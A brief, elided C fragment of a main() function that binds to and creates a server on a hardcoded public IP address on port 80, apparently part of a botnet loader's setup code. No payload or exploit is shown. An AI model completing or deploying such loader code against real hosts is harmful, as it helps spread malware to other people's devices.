...
int main(int argc, char **args)
{
    ...
    addrs[0] = inet_addr("142.93.205.6"); // Address to bind to
    ...
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "142.93.205.6", 80, "142.93.205.6")) == NULL)
    {
